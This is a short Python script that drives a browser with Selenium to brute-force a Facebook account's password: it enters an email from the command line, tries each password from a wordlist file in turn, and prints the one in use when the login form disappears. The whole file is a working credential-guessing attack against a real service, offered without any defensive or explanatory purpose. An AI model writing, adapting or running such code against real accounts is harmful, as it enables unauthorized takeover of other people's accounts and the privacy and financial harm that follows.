from selenium import webdriver
import sys 
import time
# chrome driver 
driver =webdriver.Chrome()
# get url 
url = 'https://web.facebook.com'
driver.get(url)
# open file
file= open("s.txt", encoding="utf-8")
x = [l.rstrip("\n") for l in file]
# get email input and send keys 
elem1=driver.find_element_by_id("email")
elem1.send_keys(sys.argv[1])
# loops text
for i in x: 
	#exceptions
	    try:	
		# get password and send keys   
		    elem = driver.find_element_by_id("pass")
		    elem3 =driver.find_element_by_xpath("//button[@name='login']")
		    elem.send_keys(i)
		    elem3.click()
	    except Exception as e:
	    	  print(i)
	    	  break
	    driver.back()
	  
